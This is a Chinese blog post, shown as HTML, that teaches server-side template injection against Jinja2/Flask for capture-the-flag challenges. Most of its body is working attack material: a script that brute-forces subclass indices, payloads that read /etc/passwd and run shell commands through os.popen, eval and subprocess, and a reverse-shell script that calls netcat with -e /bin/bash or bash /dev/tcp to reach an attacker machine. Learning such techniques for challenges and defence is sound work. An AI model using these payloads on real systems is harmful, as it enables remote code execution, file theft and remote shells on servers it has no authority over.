@@ -1,0 +1,445 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.2.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/avatar.jpg">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/avatar-32x32.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/avatar-16x16.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha256-XOqroi11tY4EFQMR9ZYwZWKj5ZXiftSx36RRuC3anlA=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"muxiahuo.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.20.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":true,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideDownBigOut"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+
+    <meta property="og:type" content="article">
+<meta property="og:title" content="SSTI注入">
+<meta property="og:url" content="https://muxiahuo.github.io/2024/08/08/SSTI%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="一只鼍的博客 | Glory&#39;s blog">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://muxiahuo.github.io/images/SSTI.png">
+<meta property="article:published_time" content="2024-08-08T11:40:42.000Z">
+<meta property="article:modified_time" content="2024-09-11T12:47:43.789Z">
+<meta property="article:author" content="muxiahuo">
+<meta property="article:tag" content="SSTI注入">
+<meta property="article:tag" content="注入">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://muxiahuo.github.io/images/SSTI.png">
+
+
+<link rel="canonical" href="https://muxiahuo.github.io/2024/08/08/SSTI%E6%B3%A8%E5%85%A5/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://muxiahuo.github.io/2024/08/08/SSTI%E6%B3%A8%E5%85%A5/","path":"2024/08/08/SSTI注入/","title":"SSTI注入"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>SSTI注入 | 一只鼍的博客 | Glory's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">一只鼍的博客 | Glory's blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">无欲无求，笑口常开</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BC%95%E6%93%8E%E8%AF%86%E5%88%AB"><span class="nav-number">1.</span> <span class="nav-text">引擎识别</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="nav-number">2.</span> <span class="nav-text">魔术方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5%E6%A8%A1%E5%9D%97"><span class="nav-number">3.</span> <span class="nav-text">查询注入模块</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%B3%A8%E5%85%A5%E6%A8%A1%E5%9D%97"><span class="nav-number">4.</span> <span class="nav-text">利用注入模块</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E6%B3%A8%E5%85%A5%E6%A8%A1%E5%9D%97"><span class="nav-number">5.</span> <span class="nav-text">常用注入模块</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="nav-number">5.1.</span> <span class="nav-text">文件读取</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%85%E5%BB%BA%E5%87%BD%E6%95%B0eval%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="nav-number">5.2.</span> <span class="nav-text">内建函数eval执行命令</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#os%E6%A8%A1%E5%9D%97%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="nav-number">5.3.</span> <span class="nav-text">os模块执行命令</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#importlib%E7%B1%BB%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="nav-number">5.4.</span> <span class="nav-text">importlib类执行命令</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#linecache%E5%87%BD%E6%95%B0%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="nav-number">5.5.</span> <span class="nav-text">linecache函数执行命令</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#subprocess-Popen%E7%B1%BB%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="nav-number">5.6.</span> <span class="nav-text">subprocess.Popen类执行命令</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BESSTI"><span class="nav-number">6.</span> <span class="nav-text">无回显SSTI</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">6.1.</span> <span class="nav-text">反弹shell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B8%A6%E5%A4%96%E6%B3%A8%E5%85%A5"><span class="nav-number">6.2.</span> <span class="nav-text">带外注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BA%AF%E7%9B%B2%E6%B3%A8"><span class="nav-number">6.3.</span> <span class="nav-text">纯盲注</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%95%E8%BF%87"><span class="nav-number">7.</span> <span class="nav-text">绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%8C%E5%A4%A7%E6%8B%AC%E5%8F%B7"><span class="nav-number">7.1.</span> <span class="nav-text">双大括号</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%AD%E6%8B%AC%E5%8F%B7"><span class="nav-number">7.2.</span> <span class="nav-text">中括号</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8D%95%E5%8F%8C%E5%BC%95%E5%8F%B7"><span class="nav-number">7.3.</span> <span class="nav-text">单双引号</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%8B%E5%88%92%E7%BA%BF"><span class="nav-number">7.4.</span> <span class="nav-text">下划线</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%82%B9"><span class="nav-number">7.5.</span> <span class="nav-text">点</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%85%B3%E9%94%AE%E5%AD%97"><span class="nav-number">7.6.</span> <span class="nav-text">关键字</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E2%80%9C-%E2%80%9D%E6%8B%BC%E6%8E%A5"><span class="nav-number">7.6.1.</span> <span class="nav-text">“+”拼接</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#jinjia2%E4%B8%AD%E7%9A%84%E2%80%9D-%E2%80%9D%E6%8B%BC%E6%8E%A5"><span class="nav-number">7.6.2.</span> <span class="nav-text">jinjia2中的”~”拼接</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#reverse"><span class="nav-number">7.6.3.</span> <span class="nav-text">reverse</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#replace"><span class="nav-number">7.6.4.</span> <span class="nav-text">replace</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#join"><span class="nav-number">7.6.5.</span> <span class="nav-text">join</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%A9%E7%94%A8python%E7%9A%84char%E7%9A%84ASCII%E7%A0%81"><span class="nav-number">7.6.6.</span> <span class="nav-text">利用python的char的ASCII码</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%95%B0%E5%AD%97"><span class="nav-number">7.7.</span> <span class="nav-text">数字</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E7%AC%A6%E5%8F%B7"><span class="nav-number">7.8.</span> <span class="nav-text">获取符号</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%93%E8%AF%AD"><span class="nav-number">8.</span> <span class="nav-text">结语</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="muxiahuo"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">muxiahuo</p>
+  <div class="site-description" itemprop="description">做一只自由的鼍</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">25</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">11</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://muxiahuo.github.io/2024/08/08/SSTI%E6%B3%A8%E5%85%A5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="muxiahuo">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="一只鼍的博客 | Glory's blog">
+      <meta itemprop="description" content="做一只自由的鼍">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="SSTI注入 | 一只鼍的博客 | Glory's blog">
+      <meta itemprop="description" content=" ">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          SSTI注入
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2024-08-08 19:40:42" itemprop="dateCreated datePublished" datetime="2024-08-08T19:40:42+08:00">2024-08-08</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2024-09-11 20:47:43" itemprop="dateModified" datetime="2024-09-11T20:47:43+08:00">2024-09-11</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/SSTI/" itemprop="url" rel="index"><span itemprop="name">SSTI</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>8.1k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>7 分钟</span>
+    </span>
+</div>
+
+            <div class="post-description"> </div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>&emsp;&emsp;SSTI是一种服务器端模板注入漏洞，它出现在使用模板引擎的web应用程序中。模块引擎是一种将动态数据与静态模板结合生成最终输出的工具。然而，如果在构建模板时未正确处理用户输入，就可能导致SSTI漏洞的产生。</p>
+<h3 id="引擎识别"><a href="#引擎识别" class="headerlink" title="引擎识别"></a>引擎识别</h3><p>&emsp;&emsp;做题的时候，对照这个图片就可以判断是哪种引擎了。<br><img data-src="/images/SSTI.png" alt="SSTI"></p>
+<h3 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h3><p>&emsp;&emsp;我们先了解一些基础的方法，然后就懂得payload是怎样的了。</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__class__   # 查找当前类型的所属对象</span><br><span class="line">__base__    # 沿着父子类的关系往上走一个</span><br><span class="line">__mro__     # 查找当前类对象的所有继承类</span><br><span class="line">__subclasses__() #查找父类下的所有子类，括号不能少</span><br><span class="line">__init__    # 查看类是否重载,如果出现<span class="keyword">wrapper</span>字眼，说明没有重载，就不能利用</span><br><span class="line">__globals__ # 函数会以字典的形式返回当前对象的全部全局变量</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;那么大致的做题思路就是，先判断引擎，在套用方法。</p>
+<h3 id="查询注入模块"><a href="#查询注入模块" class="headerlink" title="查询注入模块"></a>查询注入模块</h3><p>&emsp;&emsp;有回显我们可以直接用三步，将模块列举出来，没有也可以用脚本跑出来，然后选择合适的注入模块利用(用数列表示)即可。</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().<span class="emphasis">__class__</span>.<span class="emphasis">__base__</span>.<span class="emphasis">__subclasses__</span>()&#125;&#125;</span><br><span class="line">&#123;&#123;&quot;.<span class="emphasis">__class__</span>.<span class="emphasis">__base__</span>.<span class="emphasis">__subclasses__</span>()&#125;&#125;</span><br><span class="line">&#123;&#123;&quot;&quot;.<span class="emphasis">__class__</span>.<span class="emphasis">__base__</span>.<span class="emphasis">__subclasses__</span>()&#125;&#125;</span><br><span class="line">&#123;&#123;config.<span class="emphasis">__class__</span>.<span class="emphasis">__base__</span>.<span class="emphasis">__subclasses__</span>()&#125;&#125;</span><br><span class="line">&#123;&#123;[].<span class="emphasis">__class__</span>.<span class="emphasis">__base__</span>.<span class="emphasis">__subclasses__</span>()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="built_in">input</span>(<span class="string">&quot;请输入URL连接：&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    data=&#123;<span class="string">&quot;post参数&quot;</span>:<span class="string">&quot;&#123;&#123;().__class__.__base__.__subclasses__()[&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;]&#125;&#125;&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.post(url,data=data)</span><br><span class="line">        <span class="comment">#print(response.text)</span></span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;_frozen_importlib_external.FileLoader（注入模块）&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">                <span class="built_in">print</span>(i)  <span class="comment">#输出所在行数</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="利用注入模块"><a href="#利用注入模块" class="headerlink" title="利用注入模块"></a>利用注入模块</h3><p>&emsp;&emsp;知道模块所在行数(<strong>subclasses</strong>()[模块所在行数])后，就可以构造payload执行命令了,例如：</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&quot;.<span class="strong">__class__</span>.<span class="strong">__bases__</span>[<span class="string">0</span>].<span class="strong">__subclasses__</span>()[<span class="string">137</span>].<span class="strong">__init__</span>.<span class="strong">__globals__</span>[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="symbol">&#x27;eval&#x27;</span>](&#x27;<span class="strong">__import__</span>(&quot;os&quot;).popen(&quot;tac flag&quot;).read()&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;这里用的注入模块(子类)为<code>_wrap_close</code>,<font color=red>注：方法为两条下划线，类（注入模块）只有一条且注入模块的位置不固定，也就是[]里面的数字是发生变化的。</font></p>
+<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__builtins__    <span class="meta"># 提供对python的所有<span class="string">&quot;内置&quot;</span>标识符的直接访问</span></span><br><span class="line"><span class="built_in">eval</span>()          <span class="meta"># 计算字符串表达式的值</span></span><br><span class="line">popen()         <span class="meta"># 执行一个shell以运行命令来开启一个进程</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="常用注入模块"><a href="#常用注入模块" class="headerlink" title="常用注入模块"></a>常用注入模块</h3><p>&emsp;&emsp;知道上面这些方法怎么用之后，我们就可以利用注入模块，也就是里面存在的子类去调用它们执行命令(没有标记修改的说明data部分不需要修改)。常用的有</p>
+<h4 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h4><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查询注入模块  _frozen_importlib_external<span class="selector-class">.FileLoader</span></span><br><span class="line">payload: &#123;&#123;&quot;<span class="selector-class">.__class__</span><span class="selector-class">.__mro__</span><span class="selector-attr">[1]</span><span class="selector-class">.__subclasses__</span>()<span class="selector-attr">[79]</span><span class="selector-attr">[<span class="string">&quot;get_data&quot;</span>]</span>(<span class="number">0</span>,&quot;/etc/passwd&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="内建函数eval执行命令"><a href="#内建函数eval执行命令" class="headerlink" title="内建函数eval执行命令"></a>内建函数eval执行命令</h4><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">查询注入模块 <span class="variable">_wrap_close</span>或者eval</span><br><span class="line">(用查询脚本的修改部分)</span><br><span class="line">data=&#123;<span class="string">&quot;post参数&quot;</span> = “&#123;&#123;<span class="string">&quot;.__class__.__base__.__subclasses__()[&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;].__init__.__globals__[&#x27;__builtins__&#x27;]&#125;&#125;”&#125;</span></span><br><span class="line"><span class="string">if &#x27;eval&#x27; in response.text:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">payload: &#123;&#123;&quot;</span>.<span class="variable">__class__</span>.<span class="variable">__bases__</span>[<span class="number">0</span>].<span class="variable">__subclasses__</span>()[<span class="number">137</span>].<span class="variable">__init__</span>.<span class="variable">__globals__</span>[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;tac flag&quot;).read()&#x27;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="os模块执行命令"><a href="#os模块执行命令" class="headerlink" title="os模块执行命令"></a>os模块执行命令</h4><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">通过config,调用os</span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123;<span class="name">config.__class__.__init__.__globals__</span>[&#x27;os&#x27;].popen(<span class="name">&#x27;cat flag&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">通过url_for,调用os</span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123;<span class="name">url_for.__globals__.os.popen</span>(<span class="name">&#x27;/etc/passwd&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">查询注入模块 _wrap_close或者os</span></span><br><span class="line"><span class="language-xml">(用查询脚本的修改部分)</span></span><br><span class="line"><span class="language-xml">data=&#123;&quot;post参数&quot;:&quot;</span><span class="template-variable">&#123;&#123;()<span class="name">.__class__.__base__.__subclasses__</span>()[&quot;+str(i)+&quot;].__init__.globals__&#125;&#125;</span><span class="language-xml">&quot;&#125;</span></span><br><span class="line"><span class="language-xml">if &#x27;os.py&#x27; in response.text:</span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">payload: </span><span class="template-variable">&#123;&#123;<span class="name">&quot;.__class__.__bases__[0].__subclasses__()[199].__init__.__globals__[&#x27;os&#x27;].popen(&quot;</span>ls /<span class="string">&quot;).read()&#125;&#125;</span></span></span><br></pre></td></tr></table></figure>
+
+<h4 id="importlib类执行命令"><a href="#importlib类执行命令" class="headerlink" title="importlib类执行命令"></a>importlib类执行命令</h4><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">查询注入模块 _frozen_importlib.Builtinlmporter</span></span><br><span class="line"><span class="language-xml">payload: </span><span class="template-variable">&#123;&#123;<span class="name">[].__class__.__base__.__subclasses__</span>()[69][&quot;load_module&quot;](<span class="name">&quot;os&quot;</span>)[&quot;popen&quot;](<span class="name">&quot;cat flag&quot;</span>).read()&#125;&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="linecache函数执行命令"><a href="#linecache函数执行命令" class="headerlink" title="linecache函数执行命令"></a>linecache函数执行命令</h4><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">查询注入模块 linecache</span></span><br><span class="line"><span class="language-xml">(用查询脚本的修改部分)</span></span><br><span class="line"><span class="language-xml">data=&#123;&quot;post参数&quot;:&quot;</span><span class="template-variable">&#123;&#123;()<span class="name">.__class__.__bases__</span>[0].__subclasses__()[&quot;+str(i)+&quot;].__init__.__globals__&#125;&#125;</span><span class="language-xml">&quot;&#125;</span></span><br><span class="line"><span class="language-xml">if &#x27;linecache&#x27; in response.text:</span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">payload: </span><span class="template-variable">&#123;&#123;<span class="name">[].__class__.__base__.__subclasses__</span>()[191].__init__.__globals__.linecache.os.popen(<span class="name">&quot;ls -l /&quot;</span>).read()&#125;&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="subprocess-Popen类执行命令"><a href="#subprocess-Popen类执行命令" class="headerlink" title="subprocess.Popen类执行命令"></a>subprocess.Popen类执行命令</h4><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">查询注入模块 subprocess.Popen</span></span><br><span class="line"><span class="language-xml">payload: </span><span class="template-variable">&#123;&#123;()<span class="name">.__class__.__base__.__subclasses__</span>()[200](<span class="name">&quot;tac flag&quot;</span>,<span class="attr">shell</span>=<span class="literal">True</span>,<span class="attr">stdout</span>=-1).communicate()[0].strip()&#125;&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="无回显SSTI"><a href="#无回显SSTI" class="headerlink" title="无回显SSTI"></a>无回显SSTI</h3><p>&emsp;&emsp;那有人就要问了，哎呀，题目没有回显怎么办啊，简单~(用脚本无脑都可以)</p>
+<h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1&quot;</span> <span class="comment">#URL</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">300</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = &#123;<span class="string">&quot;post参数&quot;</span>:<span class="string">&#x27;&#123;&#123;&quot;&quot;.__class__.__base__.__subclasses__()[&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;].__init__.__globals__[&quot;popen&quot;](&quot;netcat 192.168.5.51(kaliIP) 7777 -e /bin/bash&quot;).read()&#125;&#125;&#x27;</span>&#125;</span><br><span class="line">        <span class="comment">#或者&quot;bash -i &gt;&amp; /dev/tcp/XXXX(服务器/跳板)/XXXX（端口号） 0&gt;&amp;1&quot;</span></span><br><span class="line">        response = requests.post(url,data=data)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;同时kali监听(nc -lnvp 7777)即可。</p>
